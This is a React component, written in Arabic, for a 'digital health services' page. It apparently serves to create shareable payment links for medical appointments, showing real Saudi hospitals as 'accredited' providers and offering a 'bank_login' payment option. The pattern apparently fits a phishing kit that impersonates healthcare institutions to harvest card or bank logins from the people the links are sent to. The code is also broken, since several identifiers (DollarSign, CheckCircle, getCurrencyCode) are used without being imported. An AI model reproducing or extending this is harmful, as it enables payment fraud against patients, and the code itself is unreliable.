import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Country, getCountryByCode } from "@/lib/countries";
import { ArrowRight, Heart, Shield, Clock, Award, Phone, MapPin, FileText, User, RefreshCw, Copy, ExternalLink, ShieldCheck, CreditCard, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";

const HealthServices = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const selectedCountry = getCountryByCode(country || "SA");
  const createLink = useCreateLink();

  const [bookingData, setBookingData] = useState({
    patientName: "",
    patientId: "",
    phone: "",
    email: "",
    appointmentDate: "",
    appointmentTime: "",
    serviceType: "",
    doctorName: "",
    notes: "",
  });

  const [amount, setAmount] = useState("250");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [showSuccess, setShowSuccess] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [copied, setCopied] = useState(false);

  const serviceTypes = [
    { value: "consultation", label: "استشارة طبية", icon: "👨‍⚕️" },
    { value: "checkup", label: "فحص دوري", icon: "🔬" },
    { value: "vaccination", label: "تطعيم", icon: "💉" },
    { value: "lab", label: "تحاليل مخبرية", icon: "🧪" },
    { value: "dental", label: "طب الأسنان", icon: "🦷" },
    { value: "eye", label: "طب العيون", icon: "👁️" },
    { value: "physiotherapy", label: "علاج طبيعي", icon: "💪" },
    { value: "mental", label: "صحة نفسية", icon: "🧠" },
  ];

  const accreditedProviders = [
    {
      name: "مستشفى الملك فيصل التخصصي",
      nameEn: "King Faisal Specialist Hospital",
      specialty: "تخصصي",
      rating: 4.9,
      location: selectedCountry?.mainCity || "الرياض",
      phone: "+966-11-464-7272",
      verified: true,
    },
    {
      name: "مستشفى الملك عبدالعزيز الجامعي",
      nameEn: "King Abdulaziz University Hospital",
      specialty: "جامعي",
      rating: 4.8,
      location: selectedCountry?.mainCity || "جدة",
      phone: "+966-12-640-8000",
      verified: true,
    },
    {
      name: "مستشفى الأمير محمد بن عبدالعزيز",
      nameEn: "Prince Mohammad Bin Abdulaziz Hospital",
      specialty: "عام",
      rating: 4.7,
      location: selectedCountry?.mainCity || "الدمام",
      phone: "+966-13-844-9000",
      verified: true,
    },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const bookingPayload = {
      patient_name: bookingData.patientName,
      patient_id: bookingData.patientId,
      phone: bookingData.phone,
      email: bookingData.email,
      doctor_name: bookingData.doctorName,
      appointment_date: bookingData.appointmentDate,
      appointment_time: bookingData.appointmentTime,
      notes: bookingData.notes,
      service_type: bookingData.serviceType,
      service_type_label: serviceTypes.find(s => s.value === bookingData.serviceType)?.label || '',
      service_type_icon: serviceTypes.find(s => s.value === bookingData.serviceType)?.icon || '',
      cod_amount: parseFloat(amount),
      payment_method: paymentMethod,
      service_name: 'الخدمات الطبية الرقمية',
      selectedCountry: country || "SA"
    };

    try {
      const link = await createLink.mutateAsync({
        type: "health",
        country_code: country || "SA",
        payload: bookingPayload,
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: 'health',
        country: country || 'SA',
        amount: parseFloat(amount),
        currency: getCurrencyCode(country || 'SA'),
        type: 'health'
      });
      setCreatedLink(paymentUrl);
      setShowSuccess(true);

      toast({
        title: "تم إنشاء الرابط بنجاح!",
        description: "يمكنك مشاركة الرابط مع المريض",
      });
    } catch (error) {
      console.error("Error creating booking:", error);
    }
  };

  if (!selectedCountry) return null;

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col" dir="rtl">
      <header className="bg-white border-b-2 border-red-500 h-16 sm:h-20 flex items-center sticky top-0 z-50 px-4 shadow-sm">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-red-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-red-200">
              <Heart className="w-6 h-6" />
            </div>
            <div>
              <h1 className="text-lg font-black text-slate-800">الخدمات الطبية الرقمية</h1>
              <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">{selectedCountry.nameAr} - DIGITAL HEALTH SERVICES</p>
            </div>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 max-w-5xl">
        <form onSubmit={handleSubmit} className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white overflow-hidden relative">
               <div className="absolute top-0 right-0 w-32 h-32 bg-red-50 rounded-full -mr-16 -mt-16 opacity-50" />
               <h2 className="text-2xl font-black text-slate-800 mb-8 flex items-center gap-3">
                  <User className="w-6 h-6 text-red-500" /> حجز موعد جديد
               </h2>

               <div className="grid md:grid-cols-2 gap-6">
                  <div className="space-y-1.5">
                    <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">اسم المريض</Label>
                    <div className="relative">
                      <Input value={bookingData.patientName} onChange={(e) => setBookingData({ ...bookingData, patientName: e.target.value })} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50 pr-12 focus:border-red-500 transition-all" placeholder="الاسم الكامل كما هو في الهوية" required />
                      <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-300" />
                    </div>
                  </div>
                  <div className="space-y-1.5">
                    <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">رقم الجوال</Label>
                    <div className="relative">
                      <Input value={bookingData.phone} onChange={(e) => setBookingData({ ...bookingData, phone: e.target.value })} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50 pr-12" placeholder="05xxxxxxxx" required />
                      <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-300" />
                    </div>
                  </div>
               </div>

               <div className="grid md:grid-cols-2 gap-6 mt-6">
                  <div className="space-y-1.5">
                    <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">المبلغ</Label>
                    <div className="relative">
                      <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50 pr-12 text-lg" required />
                      <div className="absolute right-4 top-1/2 -translate-y-1/2 font-bold text-slate-300 text-sm">ر.س</div>
                      <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-200"><DollarSign className="w-5 h-5" /></div>
                    </div>
                  </div>
                  <div className="space-y-1.5">
                    <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">الخدمة المطلوبة</Label>
                    <Select value={bookingData.serviceType} onValueChange={(v) => setBookingData({ ...bookingData, serviceType: v })}>
                      <SelectTrigger className="h-14 border-2 rounded-2xl font-black bg-slate-50/50">
                        <SelectValue placeholder="اختر نوع الخدمة" />
                      </SelectTrigger>
                      <SelectContent>
                        {serviceTypes.map(s => <SelectItem key={s.value} value={s.value}>{s.icon} {s.label}</SelectItem>)}
                      </SelectContent>
                    </Select>
                  </div>
               </div>

               <div className="mt-6 space-y-1.5">
                  <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">تاريخ الموعد</Label>
                  <div className="relative">
                    <Input type="date" value={bookingData.appointmentDate} onChange={(e) => setBookingData({ ...bookingData, appointmentDate: e.target.value })} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" required />
                  </div>
               </div>

               {parseFloat(amount) > 0 && (
                  <div className="mt-8 p-6 rounded-[2rem] bg-red-500 text-white animate-in zoom-in-95 shadow-xl shadow-red-100 flex items-center justify-between">
                     <div>
                        <p className="text-[10px] font-bold opacity-80 uppercase tracking-widest mb-1">رسوم الكشف في العيادة</p>
                        <h3 className="text-4xl font-black">{amount} <span className="text-lg">ر.س</span></h3>
                     </div>
                     <Heart className="w-12 h-12 opacity-20" />
                  </div>
               )}
            </Card>

            <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white">
               <h2 className="text-xl font-black text-slate-800 mb-6">طريقة السداد</h2>
               <div className="grid grid-cols-2 gap-4">
                  <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-[2rem] border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-red-500 bg-red-50/50' : 'border-slate-50 bg-slate-50'}`}>
                    <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-red-500' : 'text-slate-300'}`} />
                    <span className={`text-sm font-black ${paymentMethod === 'card' ? 'text-red-600' : 'text-slate-400'}`}>بطاقة دفع</span>
                  </button>
                  <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-[2rem] border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-red-500 bg-red-50/50' : 'border-slate-50 bg-slate-50'}`}>
                    <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-red-500' : 'text-slate-300'}`} />
                    <span className={`text-sm font-black ${paymentMethod === 'bank_login' ? 'text-red-600' : 'text-slate-400'}`}>تحويل بنكي</span>
                  </button>
               </div>
            </Card>

            <Button type="submit" size="lg" className="w-full h-20 rounded-[2.5rem] bg-slate-900 text-white font-black text-xl hover:bg-slate-800 transition-all shadow-2xl active:scale-95">
               إصدار رابط الموعد الطبي
            </Button>
          </div>

          <div className="space-y-6">
            <Card className="p-6 border-none shadow-lg rounded-[2rem] bg-white">
              <h3 className="font-black text-slate-800 mb-4 flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-green-500" /> مستشفيات معتمدة
              </h3>
              <div className="space-y-4">
                {accreditedProviders.map((p, i) => (
                  <div key={i} className="p-4 rounded-2xl bg-slate-50 border border-slate-100">
                    <p className="font-black text-sm text-slate-700">{p.name}</p>
                    <p className="text-[10px] text-slate-400 font-bold uppercase mt-1">{p.location}</p>
                  </div>
                ))}
              </div>
            </Card>

            <Card className="p-6 border-none shadow-lg rounded-[2rem] bg-blue-600 text-white">
               <h3 className="font-black mb-3 flex items-center gap-2"><Shield className="w-5 h-5" /> حماية البيانات</h3>
               <p className="text-xs font-bold leading-relaxed opacity-90">نحن نلتزم بأعلى معايير حماية البيانات الصحية والأمن السيبراني لضمان خصوصية المرضى.</p>
            </Card>
          </div>
        </form>
      </main>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-[2.5rem] border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-10 text-center space-y-6">
              <div className="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-2">
                <div className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center animate-bounce shadow-lg shadow-red-200">
                  <RefreshCw className="w-8 h-8 text-white" />
                </div>
              </div>
              <div className="space-y-1">
                <AlertDialogTitle className="text-3xl font-black text-slate-900">رابط الحجز جاهز!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-slate-500">تم إنشاء رابط دفع آمن للموعد الطبي بنجاح</AlertDialogDescription>
              </div>

              <div className="bg-slate-50 p-4 rounded-2xl border-2 border-dashed border-slate-200 break-all font-mono text-xs font-bold text-slate-400">
                {createdLink}
              </div>

              <div className="flex gap-4">
                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); setCopied(true); setTimeout(() => setCopied(false), 2000); toast({ title: "تم النسخ" }); }} className="flex-1 h-16 rounded-2xl font-black bg-slate-900 text-white gap-2">
                   {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                   {copied ? "تم النسخ" : "نسخ الرابط"}
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-16 rounded-2xl font-black border-2 border-slate-200 gap-2 text-slate-700">
                   <ExternalLink className="w-5 h-5" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-slate-300">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default HealthServices;
